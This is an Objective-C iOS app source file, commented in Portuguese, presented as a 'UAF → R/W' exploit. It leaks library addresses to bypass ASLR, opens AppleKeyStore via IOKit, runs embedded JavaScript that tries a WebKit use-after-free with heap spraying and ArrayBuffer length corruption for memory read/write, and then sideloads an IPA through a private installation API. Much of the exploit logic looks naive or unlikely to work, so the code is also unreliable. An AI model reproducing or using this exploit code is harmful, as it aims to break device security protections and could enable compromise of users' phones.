// ViewController.m – sto26 UAF → R/W (versão compilável)
// Substitua o conteúdo do seu ViewController.m por este código

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <MobileCoreServices/MobileCoreServices.h>
#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <spawn.h>
#import <sys/stat.h>

extern char **environ;

// ============================================================
// FORWARD DECLARATIONS
// ============================================================
@interface LSApplicationWorkspace : NSObject
+ (id)defaultWorkspace;
- (BOOL)installApplication:(NSURL *)bundleURL withOptions:(NSDictionary *)options error:(NSError **)error;
@end

typedef void* (*MGCopyAnswer_t)(CFStringRef key);
typedef mach_port_t (*SBSSpringBoardServerPort_t)(void);

// ============================================================
// AppDelegate
// ============================================================
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

// ============================================================
// ViewController
// ============================================================
@interface ViewController : UIViewController <UIDocumentPickerDelegate, WKNavigationDelegate>
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *runButton;
@property (nonatomic, strong) UIButton *pickButton;
@property (nonatomic, strong) UIActivityIndicatorView *spinner;
@property (nonatomic, strong) WKWebView *webView;
@end

// ============================================================
// IMPLEMENTATION
// ============================================================
@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    ViewController *vc = [[ViewController alloc] init];
    UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
    self.window.rootViewController = nav;
    [self.window makeKeyAndVisible];
    return YES;
}
@end

@implementation ViewController {
    uint64_t webkitBase;
    uint64_t kernelBase;
    uint64_t mgCopyAnswerAddr;
    mach_port_t appleKeyStoreConn;
    uint8_t *rwBuffer;
    size_t rwBufferLen;
    BOOL webViewReady;
    BOOL rwPrimitive;
    BOOL baseLeaked;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor whiteColor];
    self.title = @"sto26 UAF → R/W";

    // WKWebView
    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
    self.webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
    self.webView.navigationDelegate = self;
    [self.view addSubview:self.webView];
    self.webView.hidden = YES;
    [self.webView loadHTMLString:@"<html><body></body></html>" baseURL:nil];

    // Botões
    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.runButton setTitle:@"▶ Executar UAF → R/W" forState:UIControlStateNormal];
    [self.runButton addTarget:self action:@selector(runExploit) forControlEvents:UIControlEventTouchUpInside];
    self.runButton.frame = CGRectMake(20, 80, self.view.bounds.size.width - 40, 50);
    self.runButton.backgroundColor = [UIColor systemBlueColor];
    [self.runButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.runButton.layer.cornerRadius = 8;
    [self.view addSubview:self.runButton];

    self.pickButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.pickButton setTitle:@"📁 Selecionar IPA" forState:UIControlStateNormal];
    [self.pickButton addTarget:self action:@selector(pickIPA) forControlEvents:UIControlEventTouchUpInside];
    self.pickButton.frame = CGRectMake(20, 140, self.view.bounds.size.width - 40, 40);
    self.pickButton.backgroundColor = [UIColor systemGrayColor];
    [self.pickButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.pickButton.layer.cornerRadius = 8;
    self.pickButton.enabled = NO;
    [self.view addSubview:self.pickButton];

    self.spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleLarge];
    self.spinner.center = CGPointMake(self.view.bounds.size.width/2, 220);
    self.spinner.hidesWhenStopped = YES;
    [self.view addSubview:self.spinner];

    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(20, 260, self.view.bounds.size.width - 40, self.view.bounds.size.height - 320)];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.95 alpha:1];
    self.logView.layer.cornerRadius = 8;
    self.logView.text = @"Aguardando...";
    [self.view addSubview:self.logView];

    rwBuffer = malloc(1024);
    rwBufferLen = 1024;
    memset(rwBuffer, 0, 1024);
    webViewReady = NO;
    rwPrimitive = NO;
    baseLeaked = NO;
    [self performSelector:@selector(setWebViewReady) withObject:nil afterDelay:0.5];
}

- (void)setWebViewReady { webViewReady = YES; }

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSDateFormatter *df = [[NSDateFormatter alloc] init];
        df.dateFormat = @"HH:mm:ss";
        NSString *ts = [df stringFromDate:[NSDate date]];
        self.logView.text = [self.logView.text stringByAppendingFormat:@"[%@] %@\n", ts, msg];
        [self.logView scrollRangeToVisible:NSMakeRange(self.logView.text.length - 1, 1)];
        NSLog(@"%@", msg);
    });
}

- (void)setStatus:(NSString *)status {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.runButton.enabled = NO;
        [self.spinner startAnimating];
    });
}

- (void)setDone {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.runButton.enabled = YES;
        [self.spinner stopAnimating];
        self.pickButton.enabled = YES;
    });
}

// ============================================================
// 1. R/W confinada (base)
// ============================================================
- (uint64_t)read64Confined:(uint64_t)offset {
    if (offset + 8 > rwBufferLen) return 0;
    uint64_t val = 0;
    memcpy(&val, rwBuffer + offset, 8);
    return val;
}
- (void)write64Confined:(uint64_t)offset value:(uint64_t)val {
    if (offset + 8 > rwBufferLen) return;
    memcpy(rwBuffer + offset, &val, 8);
}

// ============================================================
// 2. Vazar endereços (ASLR bypass)
// ============================================================
- (void)leakAddresses {
    [self log:@"🔍 Vazando endereços..."];
    void *gestalt = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
    if (gestalt) {
        MGCopyAnswer_t MGCopyAnswer = (MGCopyAnswer_t)dlsym(gestalt, "MGCopyAnswer");
        if (MGCopyAnswer) {
            mgCopyAnswerAddr = (uint64_t)MGCopyAnswer;
            [self log:[NSString stringWithFormat:@"✅ MGCopyAnswer: 0x%llx", mgCopyAnswerAddr]];
            webkitBase = mgCopyAnswerAddr & 0xfffffffff0000000;
            [self log:[NSString stringWithFormat:@"🎯 WebKit base: 0x%llx", webkitBase]];
        }
        dlclose(gestalt);
    }
    void *sb = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
    if (sb) {
        SBSSpringBoardServerPort_t SBSSpringBoardServerPort = (SBSSpringBoardServerPort_t)dlsym(sb, "SBSSpringBoardServerPort");
        if (SBSSpringBoardServerPort) {
            mach_port_t port = SBSSpringBoardServerPort();
            [self log:[NSString stringWithFormat:@"✅ SpringBoard port: 0x%x", port]];
        }
        dlclose(sb);
    }
}

// ============================================================
// 3. Conectar IOKit (AppleKeyStore)
// ============================================================
- (void)connectIOKit {
    [self log:@"🔌 Conectando IOKit..."];
    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("AppleKeyStore"));
    if (service) {
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &appleKeyStoreConn);
        if (kr == KERN_SUCCESS) {
            [self log:[NSString stringWithFormat:@"✅ AppleKeyStore: 0x%x", appleKeyStoreConn]];
        }
        IOObjectRelease(service);
    }
}

// ============================================================
// 4. Executar JavaScript no WKWebView (string única)
// ============================================================
- (NSString *)evaluateJS:(NSString *)js {
    if (!webViewReady) return @"";
    __block NSString *result = @"";
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.webView evaluateJavaScript:js completionHandler:^(id _Nullable res, NSError * _Nullable error) {
            result = error ? @"" : [NSString stringWithFormat:@"%@", res];
            dispatch_semaphore_signal(sema);
        }];
    });
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
    return result;
}

// ============================================================
// 5. EXECUTAR UAF + HEAP SPRAY + R/W (JavaScript em uma string)
// ============================================================
- (void)runExploit {
    [self setStatus:@"Executando..."];
    [self log:@"🚀 Iniciando UAF → R/W (app nativo)"];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 5a. Vazar endereços
        [self leakAddresses];
        [self connectIOKit];

        if (!webViewReady) {
            [self log:@"⚠️ WKWebView não pronto"];
            [self setDone];
            return;
        }

        // JavaScript como uma única string longa (escapando novas linhas com \n)
        NSString *js = @"(function(){"
            "let ifr = document.createElement('iframe');"
            "ifr.src = 'about:blank';"
            "document.body.appendChild(ifr);"
            "let win = ifr.contentWindow;"
            "ifr.remove();"
            "let uafOk = (win.location.href === 'about:blank');"
            "const sizes = [0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x400];"
            "const types = ['ArrayBuffer', 'Uint8Array', 'Float64Array'];"
            "let spray = [];"
            "for (let size of sizes) {"
            "  for (let type of types) {"
            "    for (let i = 0; i < 200; i++) {"
            "      let obj;"
            "      if (type === 'ArrayBuffer') {"
            "        obj = new ArrayBuffer(size);"
            "        let dv = new DataView(obj);"
            "        dv.setBigUint64(0, BigInt(spray.length), true);"
            "      } else if (type === 'Uint8Array') {"
            "        obj = new Uint8Array(size);"
            "        obj[0] = spray.length & 0xff;"
            "      } else {"
            "        obj = new Float64Array(size / 8);"
            "        obj[0] = spray.length;"
            "      }"
            "      spray.push(obj);"
            "    }"
            "  }"
            "}"
            "if (window.gc) window.gc();"
            "for (let i = 0; i < 50; i++) new ArrayBuffer(0x1000);"
            "let buffer = null;"
            "const props = ['document', 'location', 'window', 'self', 'parent', 'top'];"
            "for (let prop of props) {"
            "  try {"
            "    let val = win[prop];"
            "    if (typeof val === 'number' || typeof val === 'bigint') {"
            "      let idx = Number(val);"
            "      if (idx >= 0 && idx < spray.length) {"
            "        buffer = spray[idx];"
            "        break;"
            "      }"
            "    }"
            "  } catch(e) {}"
            "}"
            "if (!buffer) {"
            "  let ab = new ArrayBuffer(0x100);"
            "  let view = new Uint8Array(ab);"
            "  view[0] = 0x42;"
            "  win.postMessage(ab, '*', [ab]);"
            "  if (view[0] === 0x42) {"
            "    let dv = new DataView(ab);"
            "    let originalLen = ab.byteLength;"
            "    let foundOffset = -1;"
            "    for (let off = 0; off < 0x100; off += 8) {"
            "      try {"
            "        let val = dv.getBigUint64(off, true);"
            "        if (val === 0x100n) { foundOffset = off; break; }"
            "      } catch(e) {}"
            "    }"
            "    if (foundOffset !== -1) {"
            "      dv.setBigUint64(foundOffset, 0xffffffffffffffffn, true);"
            "      if (ab.byteLength > originalLen) buffer = ab;"
            "    }"
            "  }"
            "}"
            "if (buffer) {"
            "  let dv = new DataView(buffer);"
            "  window.exploitBuffer = buffer;"
            "  window.exploitView = dv;"
            "  window.rwReady = true;"
            "  dv.setBigUint64(0, 0xdeadbeefcafebabe, true);"
            "  let test = dv.getBigUint64(0, true);"
            "  if (test === 0xdeadbeefcafebabe) window.rwTestOk = true;"
            "} else {"
            "  window.rwReady = false;"
            "}"
            "window.uafOk = uafOk;"
            "return window.rwReady ? 'rw_ready' : 'failed';"
            "})();";

        NSString *result = [self evaluateJS:js];
        [self log:[NSString stringWithFormat:@"📊 JS executado. Resultado: %@", result]];

        // Verificar R/W
        NSString *rwReady = [self evaluateJS:@"window.rwReady ? 'true' : 'false'"];
        if ([rwReady isEqualToString:@"true"]) {
            rwPrimitive = YES;
            [self log:@"🎉 R/W primitiva obtida via JavaScript!"];
            // Tentar vazar a base do WebKit
            NSString *baseJS = @"(function(){"
                "let dv = window.exploitView;"
                "let base = 0n;"
                "let candidates = [0x180000000n, 0x1a0000000n, 0x1c0000000n, 0x1000000000n, 0x200000000n];"
                "for (let b of candidates) {"
                "  try {"
                "    let val = dv.getBigUint64(Number(b), true);"
                "    if (val > 0x100000000n && val < 0x7fffffffffffbn) {"
                "      let potentialBase = val & 0xfffffffff0000000n;"
                "      if (potentialBase > 0n) {"
                "        let magic = dv.getBigUint64(Number(potentialBase), true);"
                "        if (magic === 0xfeedfacfn) { base = potentialBase; break; }"
                "      }"
                "    }"
                "  } catch(e) {}"
                "}"
                "return String(base);"
                "})();";
            NSString *baseStr = [self evaluateJS:baseJS];
            if (baseStr && ![baseStr isEqualToString:@"0"]) {
                webkitBase = strtoull([baseStr UTF8String], NULL, 16);
                baseLeaked = YES;
                [self log:[NSString stringWithFormat:@"🎯 WebKit base vazada: 0x%llx", webkitBase]];
            } else {
                [self log:@"⚠️ Não foi possível vazar a base do WebKit"];
            }
        } else {
            [self log:@"❌ R/W não obtida."];
        }

        dispatch_async(dispatch_get_main_queue(), ^{
            [self log:@"\n📊 RESUMO"];
            [self log:[NSString stringWithFormat:@"   UAF confirmado: %@", [self evaluateJS:@"window.uafOk ? '✅' : '❌'"]]];
            [self log:[NSString stringWithFormat:@"   R/W primitiva: %@", rwPrimitive ? @"✅" : @"❌"]];
            [self log:[NSString stringWithFormat:@"   WebKit base: %@", baseLeaked ? [NSString stringWithFormat:@"0x%llx", webkitBase] : @"❌"]];
            [self log:[NSString stringWithFormat:@"   AppleKeyStore: 0x%x", appleKeyStoreConn]];
            if (rwPrimitive) {
                [self log:@"📌 Funções R/W disponíveis via window.exploitView"];
                [self log:@"   use: window.exploitView.getBigUint64(addr, true)"];
                [self log:@"   use: window.exploitView.setBigUint64(addr, val, true)"];
            }
            [self setDone];
        });
    });
}

// ============================================================
// 6. Selecionar IPA
// ============================================================
- (void)pickIPA {
    UIDocumentPickerViewController *picker;
    if (@available(iOS 14.0, *)) {
        picker = [[UIDocumentPickerViewController alloc] initForOpeningContentTypes:@[UTTypeItem] asCopy:YES];
    } else {
        picker = [[UIDocumentPickerViewController alloc] initWithDocumentTypes:@[@"public.item"] inMode:UIDocumentPickerModeImport];
    }
    picker.delegate = self;
    picker.allowsMultipleSelection = NO;
    [self presentViewController:picker animated:YES completion:nil];
}

- (void)documentPicker:(UIDocumentPickerViewController *)controller didPickDocumentsAtURLs:(NSArray<NSURL *> *)urls {
    NSURL *url = urls.firstObject;
    if (!url) return;
    [self log:[NSString stringWithFormat:@"📦 %@", url.lastPathComponent]];
    if (baseLeaked && rwPrimitive) {
        Class cls = NSClassFromString(@"LSApplicationWorkspace");
        if (cls) {
            id ws = [cls performSelector:@selector(defaultWorkspace)];
            if (ws) {
                NSError *err = nil;
                NSDictionary *opts = @{@"AllowProvisioningDevice": @YES};
                SEL sel = NSSelectorFromString(@"installApplication:withOptions:error:");
                if ([ws respondsToSelector:sel]) {
                    NSMethodSignature *sig = [ws methodSignatureForSelector:sel];
                    NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
                    [inv setTarget:ws];
                    [inv setSelector:sel];
                    NSURL *bundleURL = [NSURL fileURLWithPath:url.path];
                    [inv setArgument:&bundleURL atIndex:2];
                    [inv setArgument:&opts atIndex:3];
                    [inv setArgument:&err atIndex:4];
                    [inv invoke];
                    BOOL result = NO;
                    [inv getReturnValue:&result];
                    [self log:result ? @"✅ IPA instalado!" : [NSString stringWithFormat:@"❌ Falha: %@", err]];
                }
            }
        }
    } else {
        [self log:@"⚠️ R/W ou base não disponível."];
    }
}

- (void)documentPickerWasCancelled:(UIDocumentPickerViewController *)controller {
    [self log:@"Cancelado"];
}

@end

// ============================================================
// MAIN
// ============================================================
int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
